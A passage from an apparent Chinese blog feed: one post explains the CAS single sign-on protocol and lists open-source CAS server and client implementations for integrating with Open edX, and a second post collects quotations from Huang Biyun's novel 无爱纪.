&lt;p&gt;如果LMS支持CAS（CAS Client),那么它将可能轻易与其他系统整合，外部看去浑然一体,或者至少为将来的系统之间的整合铺平道路&lt;/p&gt;
&lt;h1&gt;CAS概述&lt;/h1&gt;
&lt;p&gt;CAS来自耶鲁大学,当前的最新版本未3.0，目前由&lt;a href="https://github.com/Jasig"&gt;Jasig&lt;/a&gt;组织维护，在美国高校中被广泛采用,因此Open edX默认支持的三种外部认证中就包括它(另外两种是SSL Client Certificates和Shibboleth，参考&lt;a href="https://github.com/edx/configuration/wiki/Setting-Up-External-Authentication"&gt;Setting Up External Authentication&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;我们先摘录维基百科的一段介绍:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;集中式认证服务（英语：Central Authentication Service，缩写CAS）是一种针对万维网的单点登录协议。它的目的是允许一个用户访问多个应用程序，而只需提供一次凭证（如用户名和密码）。它还允许web应用程序在没有获得用户的安全凭据（如密码）的情况下对用户进行身份验证。“CAS”也指实现了该协议的软件包。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们可能需要先解释下什么叫单点登录&lt;/p&gt;
&lt;h3&gt;单点登录&lt;/h3&gt;
&lt;p&gt;单点登录（Single Sign On），简称为 SSO，是目前比较流行的企业业务整合的解决方案之一。SSO的定义是在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统。&lt;/p&gt;
&lt;p&gt;单点登录一般的实现方案是通过使用ticket，认证系统能识别出用户是否登录，从而只需要登录一次就能访问所有受认证系统信任的应用。因此CAS只是实现SSO的一中协议。我们也可以用SAML，以及当前很流行的JWT来实现SSO&lt;/p&gt;
&lt;h1&gt;CAS原理&lt;/h1&gt;
&lt;p&gt;CAS由三部分组成，分别为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web Browser&lt;/li&gt;
&lt;li&gt;CAS Client&lt;/li&gt;
&lt;li&gt;CAS Server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;协议过程如下如所示&lt;/p&gt;
&lt;p&gt;&lt;img alt="cas_diagram" src="img/edx/auth/cas_diagram.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;请求认证时序图为&lt;/p&gt;
&lt;p&gt;&lt;img alt="cas_diagram2" src="img/edx/auth/cas_diagram2.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;上图中TGC表示&lt;code&gt;Ticket Granted Cookie&lt;/code&gt;,ST表示&lt;code&gt;Service Ticket&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在我最近的使用场景中，CAS Client是Open edX，其他的CAS Client还包括高校的其他系统。而CAS Server由校方提供，主要对接了教务数据库。&lt;/p&gt;
&lt;p&gt;这里陈述一下我之前的一个误解，不知道大家是否也存在，我以为CAS是无法跨域的，A,B两个应用得在同个主域下才可以（通过使用子域名），因为cookie不能跨域，其实是CAS是可以跨域的。&lt;/p&gt;
&lt;p&gt;由于CAS Server的存在，起了中介者的作用，使跨域成为可能。用户访问过应用A之后，已经和CAS Server建立了会话（CAS Server上有session，而浏览器记录了和这个域名相关的cookie），这时候用户访问应用B，假设没登陆应用B，则用户被重定向到CAS Server，由于访问A时建立了会话，所以将拿到tickit，之后的过程就和上边一样了。&lt;/p&gt;
&lt;p&gt;同时补充一点关于CAS Server的说明，CAS Server专注于认证，至于认证的依据是什么，CAS支持许多方案，包括数据库，LDAP等&lt;/p&gt;
&lt;p&gt;此外我们还应该知道，使用CAS不影响web应用内部的会话机制，应用A,B都有各自的session，这样一来CAS很像一个外插设备，不会干扰既有系统，我们需要做的只是在既有web应用内实现CAS Client，目前已经有许多开源实现，几乎可能整合到任何语言里&lt;/p&gt;
&lt;p&gt;而CAS Server也有成熟的开源实现，可以直接使用，诸如著名的&lt;a href="https://github.com/Jasig/cas"&gt;Jasig/cas&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Jasig/cas&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/Jasig/cas"&gt;Jasig/cas&lt;/a&gt;是github上关注度最高的CAS Server开源实现，主页在&lt;a href="http://jasig.github.io/cas/"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/Jasig/cas"&gt;Jasig/cas&lt;/a&gt;功能十分完备&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可插拔地支持LDAP, database等&lt;/li&gt;
&lt;li&gt;支持多种协议，诸如CAS, SAML, OAuth, OpenID&lt;/li&gt;
&lt;li&gt;之多跨平台的CAS Client，支持Java, .Net, PHP, Perl, Apache等&lt;/li&gt;
&lt;li&gt;集成了uPortal, Liferay, BlueSocket, Moodle, Google Apps等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更多细节参考主页&lt;/p&gt;
&lt;h1&gt;附录：CAS实现&lt;/h1&gt;
&lt;p&gt;以下我们只关心开源实现&lt;/p&gt;
&lt;h3&gt;CAS Server&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Python&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jbittel/django-mama-cas"&gt;jbittel/django-mama-cas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/KTHse/django-cas2"&gt;KTHse/django-cas2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cameronbwhite/Flask-CAS"&gt;cameronbwhite/Flask-CAS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Nitron/django-cas-provider"&gt;Nitron/django-cas-provider&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Java&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Jasig/cas"&gt;Jasig/cas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/bujiio/buji-pac4j"&gt;bujiio/buji-pac4j&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Unicon/cas-addons"&gt;Unicon/cas-addons&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ruby&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rubycas/rubycas-server"&gt;rubycas-server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rbCAS/CASino"&gt;rbCAS/CASino&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/relevance/castronaut"&gt;relevance/castronaut&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rbCAS/CASinoApp"&gt;rbCAS/CASinoApp&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;CAS Client&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Python&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kstateome/django-cas"&gt;kstateome/django-cas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mingchen/django-cas-ng"&gt;mingchen/django-cas-ng&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Nitron/django-cas-consumer"&gt;Nitron/django-cas-consumer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Java&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Jasig/java-cas-client"&gt;Jasig/java-cas-client&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ruby&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/biola/rack-cas"&gt;biola/rack-cas&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.NET&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Jasig/dotnet-cas-client"&gt;Jasig/dotnet-cas-client&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PHP&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Jasig/phpCAS"&gt;Jasig/phpCAS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;搭建cas服务&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/apereo/cas"&gt;apereo/cas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/apereo/cas/tree/dockerized-caswebapp"&gt;dockerized-caswebapp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wnameless/docker-cas_mysql/blob/master/Dockerfile"&gt;docker-cas_mysql&lt;/a&gt;:也是基于Jasig/cas，通过端口映射，docker内容器也能使用外部数据库&lt;ul&gt;
&lt;li&gt;lynx https://localhost:49163/cas/login，只能访问https&lt;/li&gt;
&lt;li&gt;需要直接映射端口，无法使用nginx代理和ngrok&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/CenterForOpenScience/docker-library/blob/master/cas/docker-compose.yml"&gt;Central Authentication Server (CAS)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://sonnguyen.ws/install-jasig-cas-ubuntu-14-04/"&gt;INSTALL JASIG CAS IN UBUNTU 14.04&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jasig.github.io/cas/development/protocol/CAS-Protocol-Specification.html"&gt;CAS Protocol 3.0 Specification&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%9B%86%E4%B8%AD%E5%BC%8F%E8%AE%A4%E8%AF%81%E6%9C%8D%E5%8A%A1"&gt;集中式认证服务&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/loveis715/p/4491417.html"&gt;集成基于CAS协议的单点登陆&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/happyteafriends/article/details/7450104"&gt;CAS原理与配置-基于CAS的单点登陆的研究（上）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.chinaunix.net/uid-7374279-id-5213207.html"&gt; CAS实现SSO单点登录原理&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 29 Dec 2015 00:00:00 +0000</pubDate><guid>tag:,2015-12-29:use-CAS-in-your-LMS.html</guid><category>edx</category></item><item><title>无爱纪</title><link>/wu-ai-ji.html</link><description>&lt;p&gt;如果说黄碧云的这本小说有什么不足的话，我觉得是人物名字起得过于好听，以至于让人怀疑它是不是徒有其表。&lt;/p&gt;
&lt;p&gt;可你在翻完一页之后，就会为自己的断言感到羞愧了，接下去不大可能停得下来&lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;生活的丰盛如果我感到喜悦不过是有个人跟我说，我所赚的不多只能是那么多，但你喜欢吃甚么就吃甚么。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在办公室一天就像水从头上倒泼下来，一下子就到了脚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她心里总是若有所失，或许是因为失的不够多。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;夫妻这回事也像做戏，做一场戏给别人看自己也凑兴看着，从喜宴开始就是做戏，过年过节回他阿爸阿妈家又回自己阿爸阿妈家，每次都跑两台吃的菜几乎一样，都是冬菇发菜蚝豉，白切鸡，蒸石斑，一样说好吃好吃吃完又抢着入厨房洗碗才是好媳妇还不是做戏。当初结婚时没想过原来是做戏。这场戏她可以做得下去，只是米记做着做着分了心。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;即使如此人挤的时候还会有人挤着她的乳，人没有那么多的时候就会有人盯着她的胸口看，楚楚热热的觉得真是奇妙，圆圆鼓鼓的可以有这么大的魅力，米记甚至要赔上一生的承诺。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;都是因为那晚的月亮，或者是那个出租车司机，如果他不问「是不是在这里下」她或者就不会说好。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我所能有的，只是那么多。我连你一张照片都没有--我不是你的情人，虽然我给你写着极为缠绵的信。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我不是你的情人。虽然我们曾经那么亲密接近，互相了解身体。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我想如果我可以替你剪指甲该多好。我看着你的短发，怎样干干净净的在耳后。我看着你的唇，微厚的，人说唇厚的人重情欲。你会是个重声色的男子吗？你的唇会不会吻上我的?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一定会有那么一天。记忆与想念，不会比我们的生命更长；但我与那一天之间，到底要隔多长的时候，多远的空间，有几多他人的、我的、你的事情，开了几多班列车，有几多人离开又有几多人回来。那一天是否就掺在众多事情、人、时刻、距离之间，无法记认？那一天来了我都不会知道？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你不需要忘记我。我对于你来说是那么轻，你可以将我当作星期日下午的棉花糖一样不时吃一下，调调生活的味儿。你一个人的时候你会想念我，想念我对你的执恋，想：我遇到过一个热烈的女子。我却要花一生的精力去忘记，去与想念与希望斗争；事情从来都不公平，我在玩一场必输的赌局，赔上一生的情动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你说：我怕我会伤害你。在你说这句话的这一刻，我知道你一定会伤害我，而你亦知道所以你说你怕。我们好象拿着糟糕剧本的坏演员，明知结局的破烂还在那里很吃力的将戏演好。有个烂导演流里氓气的教戏：『我怕我会伤害你』的意思是：我不爱你，请你离开。于是你将我推开。那真是一场非常丑恶的戏。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们都说我是个聪明女子。我后来才明白聪明误的意思。只有自恃聪明灵敏的人才斗牛似的往狂牛的双角冲，还可以力斗几个回合，但毕竟不是斗牛士，终给撞个肚破肠流。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;聪明人轻率，自取灭亡。只有愚拙人小心翼翼，唯恐害人害己，时常不敢，心存敬惧，因而终得着安稳。我没有办法，我从小便很聪明，我父亲常说，像你这样聪明的一个人……唉。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;游忧轻轻的拍她的背，哄着她不哭，不哭，不要紧，考第四十三就第四十三，我都这样跟校长说，聪明没有用。真的楚楚你听爸爸说，有点笨日子才会过得好。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;王绛绿的乳会不会像她的，一样贴着游忧的胸膛。他们身体接近的时候，会有话吗？她会不会说，不让你走，要你时常抱着我。而游忧会默默的轻细但坚定的，推开她。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;活着那么难，活一次就够了。和影影一起成长，等于再活一次；那真是双重的磨难。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;又不是佳人浮生坎坷，但楚楚真是觉得她一步都走不动，用骡子拉她用鞭打她她都走不动了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;楚楚想爱是还未知道生活的滋味的年轻人的事情，或许影影会知道&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;绛绿可以问。她那时候还年轻。她是个勇敢的女子吧，或许很美丽。但不是我，楚楚想不像我一样从来没有年轻过、从不美丽亦不聪明的女子。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;笑得凄凄凉凉满地都是没流的眼泪，化成光。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;色如春晓，眉如剑，嘴唇饱满可以留香。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;楚楚也一动念想去敲影影的房间门， 但想想自己不过是个没有知识的小妇人，而影影是个聪明美丽的大学生，楚楚除了给她弄两餐好菜和替她洗衣服熨衣服，她没有什么可以为她做的，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;平凡无味的事情看爱情电影爱情小说看多了，没事弄事来搅得它轰轰烈烈，又不是过年要炸油角，弄得人声鼎沸油烟重重的作甚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;等待的意思是，时间过去，而我停留不动；要发生的事情没有发生。而等待是我生命里面所能承受之最重了。但我又不能说，我在等你。你和我从来没有期约。但我和你之间，还没有发生的、可能或不可能发生的，成了我生命之最重。之所以重，因为它总在未来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;外面有人影与世界，只有我和我的帽子，坚执地与时间厮守。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;像那些不愿意再等误班火车的人，愈早决定离开，或走路，都好。只有那些心存侥幸，一直在等，愈等愈觉得自己等那么久了不等下去就太不值得，就泥足深淖愈陷愈深的等下去的人，最后等到血本无归，泥淖没顶。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;楚楚拖着昨日的身子去上班，从来没有这么厌倦，催人老的不是岁月而是日复一日、一天跟另一天差不多、但又没有更好消磨生命的办法的、上班。如果不用上班该多好，她就可以躺在床上，再半睡不醒的捱下去，捱到水落石出，睡是睡醒是醒为止。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人来人往因此也是无人之境，这样地车车厢就是晚雪的无人办公室了，只有在 这个时候，她才可以让她的重担显现，如果可以，或许她会微微的叹一口气。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她想每个人的骨灰都一样，都是燐，都是物质，要藉此而记认生人，实在太荒谬了。她不敢跟她母亲说这些无情的话&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;楚楚只说，阿爸已经死了，你们的事情我知道得好少。我想知道多一点。她没有说如果你都死了，我就永远都不会知道「阿爸不是你阿爸，阿妈也不是你以为那个阿妈」是什么意思&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你说嘛。楚楚拉着她母亲的衣袖，想她小时候一样。这个动作她已经怕二三十年没有做过了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;普通生活所隐藏的危险，不为人知，若盲人临深崖。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;爱之所以为爱，或许在乎缺失。——从不可得，因此思念终生。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你是对的。你说：如果我很爱你，你就不会要我了。我当时吃了一惊，你实在太聪明了。我喜欢你，或许因为你很聪明。——大概没有无缘无故的爱吧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一星期后她好像拿公开考试成绩表一样，手心渗汗的去取。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这是真的，她的父亲不是游忧。但为什么呢？ 但他真是好。她走累了背着她的是游忧而不是晚雪。带她去饮茶、肩头让她骑着、茶楼的人都笑你本事了你小女孩你骑着你阿爸的头；那个人是游忧，不是晚雪或其他男子。和她去看电影的是游忧，她第一条牛仔裤是游忧塞钱给她买的。她要嫁给米记，沉默不语那一刻他必然心如刀割的是游忧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;游忧放下手，将眼镜慢慢收进盒子里，说，我环境亦有限，都没什么给你。楚楚接道，爸，你不要这样说。你的心意，我都知道。楚楚说着也急起来，只是我笨，我不会说。但我知道你待我好。世界上没有别的男人有你待我那么好。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她结了婚以后无论怎样赶怎样要应酬米记的家人，周末都一定会回家吃一顿晚饭。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;到她明白爱 的时候，爱已经不可能了。爱总是有所缺失。楚楚这时非常非常的伤心；她从此必须承受这缺失，直到生命的末了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这阵子我没那么想你，偶然也会忘记，原来日子即是日子，即使什么事情都没有发生，隔了日子再清晰的都会模糊起来。但记起的时候，如旧病复发，那么熟悉，忧愁的心情慢慢将我淹没。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;影影是个敏感激烈的孩子，她既折磨自己亦折磨她。敏感激烈的孩子都不快乐。她五岁已经可以发脾气成天不吃饭，不过因为米记顾着看电视转播世界杯足球赛没有跟她谈话。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这个年头做母亲就像从前做小媳妇，从前小媳妇看婆婆脸色，现在是母亲在女儿脸色，一样要察言辨色，少点警觉都不行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;午夜来的电话总是那么邪恶不祥，她摸着去接电话时想阿爸要死了，一定是医院打电话来；脚碰到冰凉的地她才想起，游忧已经死了。幸好他死了一个人不会死两次，她无法再经历他第二次的死亡。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;开始以后就像一般学生拍拖一样，一起去饭堂吃饭，一起上图书馆呀，放假一起去看电影，去离岛度假，游泳呀两个人在度假屋打二人麻将。只不过吵得厉害，其实没什么事，她怪我不打电话给她，她手机没电我怎么打电话给她&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你妈妈她很有质感，是一个生活过的人，和我们很不一样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我想我们那么接近，身体接触着身体，但我不理解她，她也没有兴趣了解我。有时我想她不过想找个人，是谁都一样，陪着做男朋友，带出来好好看看不会失礼她的女朋友就是了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;因为她是个埋藏得很深的人吧，所以很神秘。好像进了山洞就禁不住想一直走进去&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;到那一天，我不会再给你写信，你亦不要想我。我或许还会想念你，但我想念你亦与你无关。我亦不想你知道。这是我一个人的事情&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;将来历史书上都会有一段长长的空白。很多人静默无言。不是因为胆怯（我从不胆怯），不是因为忘怀（我们怎能忘怀），只有同代人能够理解发生的事情，但过后必无从说起。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但我还是心存感激。你曾经使我小小的世界变得可信可亲。当你对我说，请等一等，我在那个暗小的房间等待着你，我心里曾经充满蜜糖与奶香的喜悦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;知你睡了，怕打扰你；但又想让你半睡不醒的找着你，让你不那么理智冷静的跟我说几句话。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她说她爱但她爱的不是我；她只是爱她的爱；她的激烈；她的自毁；我不过是一个临时演员在陪她表演&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;死到临头，太初还牢牢的记得，她站在那间黄亮的草屋之中，稻草嗅着香，还有蟋蟀此起彼落的作 夏日颂鸣。只是有这么一次，她一生人最珍贵的回忆，从不老也不毁坏，比金子还要 沉重长久。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;所以，你就跟别人不一样了？尾音微微的吊高，像一句问话，但又可能是一句按语。如一丢下了手中的小草，说，我可没这样说。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如一递来了他的手帕，她接过去抹了汗，手帕上有了她的气味，这小小的洁白方帕，既是他也是她的了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;太大胆了这个莫如一实在太大胆，但她已经跌入一个她自己密谋的思念陷阱之中，无法再逃出去了。无法逃出，无法回到当初；她关上家中的门那一刻，她就知道自己别无去路；好像给赶入斗牛场的牛，铜管乐奏起拱圆的斗牛场灯火通明，观众在欢呼抹手汗，预备抛下手中的康乃馨和白手巾，围栏已经关上，斗牛士在她面前微笑，等待她激烈的死亡。她无可后退，因为她不想后退；只是这么的一次，她要和她的生命面对面，她不想再妥协了，她已经妥协了一生&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;言语挑逗令她一点都不想吃。她饿的是另一些。那么饿，饿到她不想吃。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;二人的话说得着了火，有点无以为继，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;楚楚推磨着，如一推磨着，两个没钱的人似的都不敢叫结账，结了帐就分明了，分手，各自回家，还是让事情发生。发生……并且怎样发生……？楚楚身子热热的，分明的渴望着。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她听得要走了，便哇的哭起来；完了，这 么好的一个节日就完了；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;世界在无声转动。她的指尖有星，身就是银河，在夜之中静默发亮。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;楚楚却没动，头倚在门框上，药力过了有点晕，睡多了似的呆钝，站着看她母亲点了火，喳喳的爆着蒜头香，又喳喳的炒菜；另一个炉喷着蒸气晚雪就站在白烟烟的蒸气里面，如果有天堂楚楚想天堂的云雾可能只是蒸鱼的香气&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;无论怎样她心里都有一个位置留给如一，无论如一在或不在，无论生或死亡，分离或不&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;生命或死亡那么严重的事情。不严重，像流鼻血和流经血，但足可以让她明白，她所把持的，不过是一个肉身。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
